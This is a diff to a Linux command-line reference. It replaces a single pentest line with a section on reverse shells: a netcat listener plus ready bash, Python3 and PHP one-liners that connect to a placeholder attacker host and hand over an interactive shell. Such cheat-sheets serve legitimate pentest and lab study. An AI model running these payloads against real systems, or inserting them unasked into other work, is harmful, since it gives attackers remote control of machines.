@@ -159,8 +159,35 @@ This master reference document outlines essential Linux command-line operations 
 * `ssh -L [local_port]:localhost:[remote_port] [user]@[host]` - Local Port Forwarding.
 * `ssh -D [local_port] [user]@[host]` - Dynamic Port Forwarding (SOCKS Proxy).
 
-## 21. Pentest
-* `bash -c 'bash -i >& /dev/tcp/TU_IP_KALI/4444 0>&1'` - Reverse shell injection.
+### 21. Pentest: Reverse Shells (Payloads & Listeners)
+
+**1. Setup the Listener (Attacker Machine)**
+Always start the listener before executing the payload on the target to catch the incoming connection.
+```bash
+nc -lvnp <LPORT>
+```
+
+**2. Execute the Payload (Target Machine)**
+Inject the appropriate payload based on the target environment. 
+
+> **Legend:**
+> * `<LHOST>`: Your attack machine IP (e.g., `tun0` interface).
+> * `<LPORT>`: The port you opened on your listener.
+
+**Option A: Bash (Standard Linux)**
+```bash
+bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'
+```
+
+**Option B: Python3 (Reliable alternative if bash redirection fails)**
+```python
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<LHOST>",<LPORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
+```
+
+**Option C: PHP (Web Server / Command Injection via URL)**
+```php
+php -r '$sock=fsockopen("<LHOST>",<LPORT>);exec("/bin/sh -i <&3 >&3 2>&3");'
+```
 
 ## Appendix: Interactive VM Verification
 ```text
